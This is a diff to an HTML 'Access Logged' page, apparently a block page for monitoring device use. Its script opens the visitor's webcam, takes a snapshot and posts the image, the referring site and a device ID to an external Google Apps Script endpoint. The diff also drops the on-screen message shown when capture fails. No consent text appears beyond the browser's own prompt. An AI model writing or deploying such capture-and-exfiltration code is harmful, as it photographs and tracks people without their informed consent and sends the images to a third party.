@@ -3,24 +3,29 @@
 <head>
   <title>Access Logged</title>
   <script>
-    const scriptURL = "https://docs.google.com/forms/d/e/1FAIpQLSf1C_6KKbmpRTcSuAehZV_0hbtMyouGylAwvL1liIi3M4v6hQ/formResponse";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxT4r0Dpyy6O0OA_HFa1lfPeI5EN5RwnzTP162Pr1mfxVyEQdaQQTZ1URXcrgdlbQ5X/exec"; // New Web App URL
+
     const deviceID = new URLSearchParams(window.location.search).get('device') || 'UNKNOWN';
     const referrer = document.referrer || 'Unknown Site';
 
     function sendSnapshot(imgData) {
-      const formData = new URLSearchParams();
+      const formData = new FormData();
       formData.append('entry.2012483072', imgData);        // Snapshot
       formData.append('entry.500527079', referrer);        // Visited Site
       formData.append('entry.1027569634', deviceID);       // Device ID
 
-      navigator.sendBeacon(scriptURL, formData);
-      console.log("Beacon sent");
-      }
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      }).then(() => {
+        console.log("Violation logged via Google Form");
+      }).catch(err => console.error("Log failed", err));
+    }
 
     function snap() {
       const video = document.createElement('video');
       const canvas = document.createElement('canvas');
-
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
@@ -31,13 +36,12 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             const image = canvas.toDataURL("image/png");
             sendSnapshot(image);
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach(t => t.stop());
             document.body.innerHTML = "<h2>Violation Logged</h2>";
           }, 1500);
         })
         .catch(err => {
-          console.error("Camera access denied or failed", err);
-          document.body.innerHTML = "<h2>Camera access failed</h2>";
+          console.error("Camera access failed", err);
         });
     }
 
